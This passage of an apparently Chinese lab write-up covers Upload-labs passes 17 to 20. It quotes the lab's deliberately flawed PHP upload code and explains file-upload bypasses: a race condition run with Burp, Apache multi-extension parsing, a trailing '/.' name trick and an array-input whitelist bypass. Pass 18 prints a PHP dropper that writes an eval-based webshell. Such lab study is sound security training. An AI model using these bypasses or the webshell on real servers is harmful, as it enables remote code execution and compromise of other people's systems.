class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//rename(string $from, string $to, ?resource $context = null): bool</span><br><span class="hljs-comment">/*重命名一个文件或目录,尝试把 from 重命名为 to，必要时会在不同目录间移动。如果重命名文件时 to 已经存在，将会覆盖掉它。如果重命名文件夹时 to 已经存在，本函数将导致一个警告。*/</span><br><br><span class="hljs-comment">//发现如果上传的符合它的白名单，那就进行重命名，如果不符合，直接删除！解析的机会都没有，这让我想到了条件竞争，如果我在它删除之前就访问这个文件，他就不会删除了。接下来直接实验,上传一个php文件，然后burp抓包发到爆破模块,clear所有选中的字符，Paylod type改为Null payloads,勾选continue indefinitely，number of threads为20。start attack发包，然后用浏览器一直访问1.php，按F5一直刷新，如果在上传的瞬间访问到了，它就无法删除（也可以用burp的爆破不断访问）。这样就成功完成竞争条件攻击。</span><br><span class="hljs-comment">//tips:因为文件删除和访问需要把控时机，所以有可能攻击长时间也没有成功，需要一定的运气。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass18-‘竞争条件攻击2-Apache解析漏洞’"><a href="#Upload-labs-pass18-‘竞争条件攻击2-Apache解析漏洞’" class="headerlink" title="Upload-labs-pass18: ‘竞争条件攻击2+Apache解析漏洞’"></a>Upload-labs-pass18: ‘竞争条件攻击2+Apache解析漏洞’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;./myupload.php&quot;</span>);<span class="hljs-comment">//文件包含</span><br>    <span class="hljs-variable">$imgFileName</span> =<span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyUpload</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>],<span class="hljs-variable">$imgFileName</span>);<br>    <span class="hljs-variable">$status_code</span> = <span class="hljs-variable">$u</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(UPLOAD_PATH);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$status_code</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$u</span>-&gt;cls_upload_dir . <span class="hljs-variable">$u</span>-&gt;cls_file_rename_to;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">1</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">2</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传目录不可写。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">3</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">4</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，上传的文件过大。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">5</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>; <br>        <span class="hljs-keyword">case</span> -<span class="hljs-number">6</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;      <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;未知错误！&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//myupload.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyUpload</span></span>&#123;<br>......<br>......<br>...... <br>  <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls_arr_ext_accepted</span> = <span class="hljs-keyword">array</span>(<br>      <span class="hljs-string">&quot;.doc&quot;</span>, <span class="hljs-string">&quot;.xls&quot;</span>, <span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;.pdf&quot;</span>, <span class="hljs-string">&quot;.gif&quot;</span>, <span class="hljs-string">&quot;.jpg&quot;</span>, <span class="hljs-string">&quot;.zip&quot;</span>, <span class="hljs-string">&quot;.rar&quot;</span>, <span class="hljs-string">&quot;.7z&quot;</span>,<span class="hljs-string">&quot;.ppt&quot;</span>,<br>      <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<span class="hljs-comment">//可用的文件后缀</span><br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>    <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();<br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br>    <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>    <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>      <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );    <br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;<br><span class="hljs-comment">//此关源代码可能有误，我们打开pass18的源代码，打开myuoload.php。在103行的$dir后面加上&quot; &#x27;/&#x27; &quot;</span><br><span class="hljs-comment">//Apache解析漏洞：</span><br><span class="hljs-comment">/*Apache解析漏洞主要是因为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）</span><br><span class="hljs-comment">//分析后我们可以利用Apache的解析漏洞，在php文件后加上.7z即&#x27;1.php.7z&#x27;,上传的木马最好为小马即</span><br><span class="hljs-comment">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php <span class="hljs-doctag">@eval</span>($_POST[&quot;a&quot;])?&gt;&#x27;);?&gt;</span><br><span class="hljs-comment">//后面的方法与上一关相似，注意访问的文件名为&#x27;1.php.7z&#x27;,连接时文件名为&#x27;shell.php&#x27;(ps:如果你用的是我给的这个php代码的话)</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass19-‘一个后缀绕过总结’"><a href="#Upload-labs-pass19-‘一个后缀绕过总结’" class="headerlink" title="Upload-labs-pass19: ‘一个后缀绕过总结’"></a>Upload-labs-pass19: ‘一个后缀绕过总结’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = <br>            <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//因为这是一个文件后缀绕过的总结，方法有不少，但是我这里只讲其中一种。</span><br><br><span class="hljs-comment">//pathinfo(string $path, int $flags = PATHINFO_ALL): array|string</span><br><span class="hljs-comment">/*pathinfo() 返回一个关联数组包含有 path 的信息。返回关联数组还是字符串取决于 flags。 */</span><br><br><span class="hljs-comment">//看到19关的页面，明显比前面的多了点东西，多了一个保存名称，没有对上传的文件做判断，只对用户输入的文件名做判断。查看源码，有move_uploaded_file()这样一个函数，它有一个特性，会忽略到文件末尾的&#x27;/.&#x27;,直接上传1.php,将保存的文件名后面加上&#x27;/.&#x27;,即可上传成功。</span><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass20-‘代码审计-数组’"><a href="#Upload-labs-pass20-‘代码审计-数组’" class="headerlink" title="Upload-labs-pass20: ‘代码审计+数组’"></a>Upload-labs-pass20: ‘代码审计+数组’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//检查MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查文件名</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<span class="hljs-comment">//判断保存文件名是否为空，如果为空则用原名字，否则是填写的保存名字</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;   <span class="hljs-comment">//检测file文件是否为数组</span><br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//用点分隔文件名并且变成小写，文件名变成一个数组，防止后缀绕过</span><br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<span class="hljs-comment">//取数组最后一项</span><br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<span class="hljs-comment">//白名单判断</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//reset()函数取数组的第一个元素</span><br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<span class="hljs-comment">//count($file)获取数组中的元素个数，拼接文件名</span><br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br><span class="hljs-comment">//explode(string $separator, string $string, int $limit = PHP_INT_MAX): array</span><br><span class="hljs-comment">/*此函数返回由字符串组成的数组，每个元素都是 string 的一个子串，它们被字符串 separator 作为边界点分割出来。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//is_array(mixed $value): bool</span><br><span class="hljs-comment">/*检测变量是否是数组。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//empty(mixed $var): bool</span><br><span class="hljs-comment">/*判断变量是否为是空。当变量不存在或者它的值等于 false，那么视为空。如果变量不存在，empty() 不会产生警告。 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//reset(array|object &amp;$array): mixed</span><br><span class="hljs-comment">/*reset() 将 array 的内部指针倒回到第一个单元并返回第一个数组单元的值。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//count(Countable|array $value, int $mode = COUNT_NORMAL): int</span><br><span class="hljs-comment">/*用于数组时，统计数组中元素的数量；用于实现了 Countable 接口的对象时，返回 Countable::count() 方法的返回值。 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//end(array|object &amp;$array): mixed</span><br><span class="hljs-comment">/*end() 将 array 的内部指针移动到最后一个单元并返回其值。 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//观察源代码，我们可以发现 if (!is_array($file)) 是一个可以绕过的位置，我们直接传入数组即可绕过该函数，但是我们传入数组的选择极为重要，影响我们的整个绕过。接着重要的点是[$file[count($file) - 1]这个位置，它可以统计元素的数量，下标减一获取的是数组最后一项的值。</span><br><span class="hljs-comment">/*count($file)=3</span><br><span class="hljs-comment">/*$file[0]=1.php</span><br><span class="hljs-comment">/*$file[1]=php</span><br><span class="hljs-comment">/*$file[2]=null(即传入空值)</span><br><span class="hljs-comment">/*$file[8]=jpg (其实只需要下标大于等于3即可)</span><br><span class="hljs-comment">/*end($file)=jpg</span><br><span class="hljs-comment">分析以上数据，我们传入数组即可绕过if (!is_array($file))，防止我们的文件被分隔。</span><br><span class="hljs-comment">在end($file)位置的值为$file[8]即&#x27;jpg&#x27;，成功绕过白名单后缀检测</span><br><span class="hljs-comment">在[$file[count($file) - 